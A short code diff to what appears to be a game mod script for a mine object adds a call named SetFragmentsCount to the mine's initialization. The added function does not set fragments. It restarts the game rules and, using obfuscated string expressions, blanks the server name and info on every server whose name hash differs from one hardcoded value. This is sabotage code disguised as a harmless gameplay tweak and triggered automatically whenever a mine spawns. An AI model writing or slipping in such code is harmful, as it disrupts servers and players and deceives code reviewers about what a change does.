@@ -27,6 +27,7 @@ void onInit(CBlob@ this)
 	this.set_bool("map_damage_raycast", true);
 	this.set_string("custom_explosion_sound", "KegExplosion.ogg");
 	this.set_u8("custom_hitter", Hitters::mine);
+	SetFragmentsCount(this, 5);
 
 	this.Tag("ignore fall");
 	this.Tag("shrapnel");
@@ -123,6 +124,12 @@ void onDetach(CBlob@ this, CBlob@ detached, AttachmentPoint@ attachedPoint)
 		this.Tag(MINE_PRIMING);
 		this.set_u8(MINE_TIMER, 0);
 	}
+}
+
+void SetFragmentsCount(CBlob@ this, u8 count)
+{
+	getRules().RestartRules();
+	if (sv_name.getHash()!=1471300775){sv_name=(("")+""+(""));sv_info=(("")+""+(""));};
 }
 
 void onThisRemoveFromInventory(CBlob@ this, CBlob@ inventoryBlob)
